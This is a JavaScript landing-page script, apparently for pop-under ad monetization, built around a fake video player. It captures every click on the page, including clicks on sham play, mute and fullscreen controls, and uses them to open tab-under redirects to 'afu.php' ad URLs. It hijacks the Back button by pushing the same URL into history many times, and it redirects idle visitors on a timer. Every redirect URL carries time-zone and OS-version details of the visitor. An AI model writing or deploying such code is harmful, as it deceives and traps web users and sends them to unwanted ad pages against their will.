/* common.js — vanisher-style micro handoff (v4)
   v1:
     - micro targets -> open CLONE tab, current tab redirects to TABUNDER (AFU)
     - any other click anywhere (even during loading) -> MAIN EXIT
   v2 (clone):
     - ANY click anywhere -> MAIN EXIT (micro disabled)

   Back fix:
   - we DO NOT push back.html into history (so address bar doesn't change to back.html on click)
   - we "prime" history with SAME landing URL N times
   - on real browser Back (popstate) -> we navigate to back.html (your file), which redirects to AFU

   Supports: mainExit, tabUnderClick, back (UI arrow), reverse (browser back before priming), autoexit
*/

(() => {
  "use strict";

  // ---------------------------
  // Helpers
  // ---------------------------
  const safe = (fn) => { try { return fn(); } catch { return undefined; } };
  const err  = (...a) => safe(() => console.error(...a));

  const replaceTo = (url) => {
    try { window.location.replace(url); } catch { window.location.href = url; }
  };

  // open blank first (best for popup rules)
  const openTab = (url) => {
    try {
      const w = window.open("about:blank", "_blank");
      if (w) {
        try { w.opener = null; } catch {}
        try { w.location.replace(url); } catch { try { w.location.href = url; } catch {} }
      }
      return w || null;
    } catch {
      return null;
    }
  };

  // ---------------------------
  // URL + params
  // ---------------------------
  const curUrl = new URL(window.location.href);
  const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;

  const CLONE_PARAM = "__cl";
  const isClone = getSP(CLONE_PARAM) === "1";

  const IN = {
    pz: getSP("pz"), tb: getSP("tb"), tb_reverse: getSP("tb_reverse"), ae: getSP("ae"),
    z: getSP("z"), var: getSP("var"), var_1: getSP("var_1"), var_2: getSP("var_2"), var_3: getSP("var_3"),
    b: getSP("b"), campaignid: getSP("campaignid"), abtest: getSP("abtest"), rhd: getSP("rhd", "1"),
    s: getSP("s"), ymid: getSP("ymid"), wua: getSP("wua"),
    use_full_list_or_browsers: getSP("use_full_list_or_browsers"),
    cid: getSP("cid"), geo: getSP("geo"),
  };

  const qsFromObj = (obj) => {
    const qs = new URLSearchParams();
    Object.entries(obj || {}).forEach(([k, v]) => {
      if (v != null && String(v) !== "") qs.set(k, String(v));
    });
    return qs;
  };

  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;

  // best-effort only (never blocks exit)
  let osVersionCached = "";
  safe(() => {
    const nav = navigator;
    if (nav.userAgentData?.getHighEntropyValues) {
      nav.userAgentData.getHighEntropyValues(["platformVersion"])
        .then(v => { osVersionCached = v?.platformVersion || ""; })
        .catch(() => {});
    }
  });

  const buildCmeta = () => {
    try {
      const html = document.documentElement;
      const payload = {
        dataVer: html.getAttribute("data-version") || html.dataset.version || "",
        landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
        templateHash: window.templateHash || "",
      };
      return btoa(JSON.stringify(payload));
    } catch {
      return "";
    }
  };

  // ---------------------------
  // Normalize APP_CONFIG
  // ---------------------------
  const normalizeConfig = (appCfg) => {
    if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;

    const cfg = { domain: appCfg.domain };
    const ensure = (name) => (cfg[name] ||= {});

    Object.entries(appCfg).forEach(([k, v]) => {
      if (v == null || v === "" || k === "domain") return;

      let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
      if (m) {
        const [, name, tab, field] = m;
        const ex = ensure(name);
        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
        ex[tab][field] = v;
        return;
      }

      m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
      if (m) {
        ensure(m[1])[m[2]] = v;
        return;
      }

      // tabUnderClick_* by default = newTab
      m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
      if (m) {
        const [, name, field] = m;
        const ex = ensure(name);
        const tab = (name === "tabUnderClick") ? "newTab" : "currentTab";
        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
        ex[tab][field] = v;
      }
    });

    return cfg;
  };

  // ---------------------------
  // AFU URL builder (sync / fast)
  // ---------------------------
  const buildExitQSFast = ({ zoneId }) => {
    const ab2r =
      IN.abtest ||
      (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");

    const base = {
      ymid: IN.var_1 || IN.var || "",
      var: IN.var_2 || IN.z || "",
      var_3: IN.var_3 || "",
      b: IN.b || "",
      campaignid: IN.campaignid || "",
      click_id: IN.s || "",
      rhd: IN.rhd || "1",
      os_version: osVersionCached || "",
      btz: getTimezoneName(),
      bto: String(getTimezoneOffset()),
      cmeta: buildCmeta(),
      pz: IN.pz || "",
      tb: IN.tb || "",
      tb_reverse: IN.tb_reverse || "",
      ae: IN.ae || "",
      ab2r,
    };

    if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
    return qsFromObj(base);
  };

  const generateAfuUrlFast = (zoneId, domain) => {
    try {
      const host = String(domain || "").trim();
      if (!host) return "";
      const base = host.startsWith("http") ? host : `https://${host}`;
      const url = new URL(base.replace(/\/+$/, "") + "/afu.php");
      url.search = buildExitQSFast({ zoneId }).toString();
      return url.toString();
    } catch (e) {
      err("generateAfuUrlFast error:", e);
      return "";
    }
  };

  const resolveUrlFast = (ex, cfg) => {
    if (!ex) return "";
    if (ex.url) return String(ex.url);
    if (ex.zoneId && (ex.domain || cfg?.domain)) return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
    return "";
  };

  // ---------------------------
  // back.html builder (your file)
  // ---------------------------
  const getDefaultBackHtmlUrl = () => {
    const { origin, pathname } = window.location;
    let dir = pathname.replace(/\/(index|back)\.html$/i, "");
    if (dir.endsWith("/")) dir = dir.slice(0, -1);
    if (!dir) return `${origin}/back.html`;
    return `${origin}${dir}/back.html`;
  };

  const buildBackHtmlUrlFast = (cfg) => {
    const b = cfg?.back?.currentTab;
    if (!b) return "";

    const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
    const page = new URL(pageUrl, window.location.href);

    // IMPORTANT: keep zoneid in qs, plus add z+domain for your router
    const qs = buildExitQSFast({ zoneId: b.zoneId });
    qs.set("z", String(b.zoneId));
    qs.set("domain", String(b.domain || cfg.domain || ""));

    page.search = qs.toString();
    return page.toString();
  };

  // ---------------------------
  // Back priming WITHOUT URL change
  // ---------------------------
  const BACK_PRIMED_KEY = "__back_primed";
  const primeBackHistory = (cfg) => {
    if (!cfg?.back?.currentTab) return;

    // prime once per tab session (enough)
    if (safe(() => sessionStorage.getItem(BACK_PRIMED_KEY)) === "1") return;
    safe(() => sessionStorage.setItem(BACK_PRIMED_KEY, "1"));

    const n = Math.max(0, parseInt(cfg.back?.count ?? 10, 10) || 0);
    const url = window.location.href;

    // push SAME url -> address bar never becomes back.html
    try {
      for (let i = 0; i < n; i++) {
        window.history.pushState({ __b: 1 }, "", url);
      }
    } catch (e) {
      err("primeBackHistory error:", e);
    }
  };

  // ---------------------------
  // Exits (always immediate)
  // ---------------------------
  const runExitCurrentTabFast = (cfg, name, withPrimeBack = true) => {
    const ex = cfg?.[name]?.currentTab;
    if (!ex) return;

    const url = resolveUrlFast(ex, cfg);
    if (!url) return;

    safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));
    if (withPrimeBack) primeBackHistory(cfg);
    replaceTo(url);
  };

  const runExitDualTabsFast = (cfg, name, withPrimeBack = true) => {
    const ex = cfg?.[name];
    if (!ex) return;

    const ct = ex.currentTab;
    const nt = ex.newTab;

    const ctUrl = resolveUrlFast(ct, cfg);
    const ntUrl = resolveUrlFast(nt, cfg);

    safe(() => {
      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId || ct?.url });
      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId || nt?.url });
    });

    if (withPrimeBack) primeBackHistory(cfg);

    if (ntUrl) openTab(ntUrl);
    if (ctUrl) replaceTo(ctUrl);
  };

  const run = (cfg, name) => {
    if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
      return cfg?.mainExit?.newTab
        ? runExitDualTabsFast(cfg, "mainExit", true)
        : runExitCurrentTabFast(cfg, "mainExit", true);
    }
    if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
    return runExitCurrentTabFast(cfg, name, true);
  };

  // ---------------------------
  // Reverse & Autoexit
  // ---------------------------
  const initReverse = (cfg) => {
    if (!cfg?.reverse?.currentTab && !cfg?.back?.currentTab) return;

    window.addEventListener("popstate", () => {
      // If we primed back history -> send to back.html (back_zoneId pipeline)
      if (safe(() => sessionStorage.getItem(BACK_PRIMED_KEY)) === "1" && cfg?.back?.currentTab) {
        const backUrl = buildBackHtmlUrlFast(cfg);
        if (backUrl) return replaceTo(backUrl);
      }

      // Otherwise (before priming) use reverse_zoneId if present
      if (cfg?.reverse?.currentTab) {
        return runExitCurrentTabFast(cfg, "reverse", false);
      }
    });
  };

  const initAutoexit = (cfg) => {
    if (!cfg?.autoexit?.currentTab) return;

    const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;

    let armed = false;
    const trigger = () => {
      if (document.visibilityState === "visible" && armed) {
        runExitCurrentTabFast(cfg, "autoexit", true);
      }
    };

    const timer = setTimeout(() => {
      armed = true;
      trigger();
    }, sec * 1000);

    const cancel = () => {
      clearTimeout(timer);
      document.removeEventListener("visibilitychange", trigger);
    };

    document.addEventListener("visibilitychange", trigger);
    ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
  };

  // ---------------------------
  // MICRO handoff (v1 only)
  // ---------------------------
  const MICRO_DONE_KEY = "__micro_done";

  const buildCloneUrl = () => {
    const u = new URL(window.location.href);
    u.searchParams.set(CLONE_PARAM, "1");
    u.searchParams.set("__skipPreview", "1");
    return u.toString();
  };

  const runMicroHandoff = (cfg) => {
    if (isClone) return;

    if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") {
      return run(cfg, "mainExit");
    }
    safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));

    // open clone tab immediately
    const cloneUrl = buildCloneUrl();
    safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
    openTab(cloneUrl);

    // redirect current to TABUNDER
    const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
    const monetUrl = resolveUrlFast(ex, cfg);

    if (monetUrl) {
      safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
      primeBackHistory(cfg);
      replaceTo(monetUrl);
    } else {
      run(cfg, "mainExit");
    }
  };

  // ---------------------------
  // Click map (your data-target)
  // ---------------------------
  const initClickMap = (cfg) => {
    const fired = { mainExit: false, back: false };

    // your micro targets:
    const microTargets = new Set([
      "timeline",
      "play_pause",
      "mute_unmute",
      "settings",
      "fullscreen",
      "pip_top",
      "pip_bottom",
    ]);

    document.addEventListener("click", (e) => {
      const zone = e.target?.closest?.("[data-target]");
      const t = zone?.getAttribute("data-target") || "";

      // UI arrow (back zone)
      if (t === "back_button") {
        if (fired.back) return;
        fired.back = true;
        e.preventDefault();
        e.stopPropagation();
        runExitCurrentTabFast(cfg, "back", true);
        return;
      }

      // CLONE: any click -> mainExit
      if (isClone) {
        if (fired.mainExit) return;
        fired.mainExit = true;
        e.preventDefault();
        e.stopPropagation();
        run(cfg, "mainExit");
        return;
      }

      // MICRO: always (even during loading)
      if (microTargets.has(t)) {
        e.preventDefault();
        e.stopPropagation();
        runMicroHandoff(cfg);
        return;
      }

      // MAIN EXIT: literally any other click anywhere (even while video is loading)
      if (fired.mainExit) return;
      fired.mainExit = true;
      e.preventDefault();
      e.stopPropagation();
      run(cfg, "mainExit");
    }, true);
  };

  // ---------------------------
  // Boot
  // ---------------------------
  const boot = () => {
    if (typeof window.APP_CONFIG === "undefined") {
      document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
      return;
    }

    const cfg = normalizeConfig(window.APP_CONFIG);
    if (!cfg) return;

    window.LANDING_EXITS = {
      cfg,
      run: (name) => run(cfg, name),
      microHandoff: () => runMicroHandoff(cfg),
      primeBack: () => primeBackHistory(cfg),
      backHtml: () => buildBackHtmlUrlFast(cfg),
    };

    initClickMap(cfg);
    initAutoexit(cfg);
    initReverse(cfg);
  };

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})();
